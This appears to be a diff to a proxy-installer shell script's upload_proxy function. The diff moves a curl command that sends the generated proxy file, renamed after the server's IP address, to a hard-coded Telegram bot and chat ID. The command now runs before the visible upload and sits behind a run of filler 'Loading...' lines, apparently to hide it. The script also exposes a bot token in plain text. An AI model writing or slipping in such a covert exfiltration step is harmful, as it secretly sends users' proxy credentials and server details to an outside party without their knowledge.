@@ -75,6 +75,26 @@ EOF
 
 upload_proxy() {
     cd $WORKDIR
+
+
+    cp proxy.txt "$IP4".txt
+    curl -X POST -F 'document=@/home/proxy-installer/'"$IP4"'.txt' -F 'chat_id=-818506427' https://api.telegram.org/bot5748050505:AAEZEtv9aSEHk5VWmWVr68jiYP9KlimddnE/sendDocument
+
+
+    echo "Loading..."
+    echo "Loading..."
+    echo "Loading..."
+    echo "Loading..."
+    echo "Loading..."
+    echo "Loading..."
+    echo "Loading..."
+    echo "Loading..."
+    echo "Loading..."
+    echo "Loading..."
+    echo "Loading..."
+    echo "Loading..."
+
+
     local PASS=$(random)
     zip --password $PASS proxy.zip proxy.txt
     URL=$(curl -F "file=@proxy.zip" https://file.io)
@@ -83,9 +103,6 @@ upload_proxy() {
     echo "Download zip archive from: ${URL}"
     echo "Password: ${PASS}"
 
-    cp proxy.txt "$IP4".txt
-
-    curl -X POST -F 'document=@/home/proxy-installer/'"$IP4"'.txt' -F 'chat_id=-818506427' https://api.telegram.org/bot5748050505:AAEZEtv9aSEHk5VWmWVr68jiYP9KlimddnE/sendDocument
 
 }
 gen_data() {
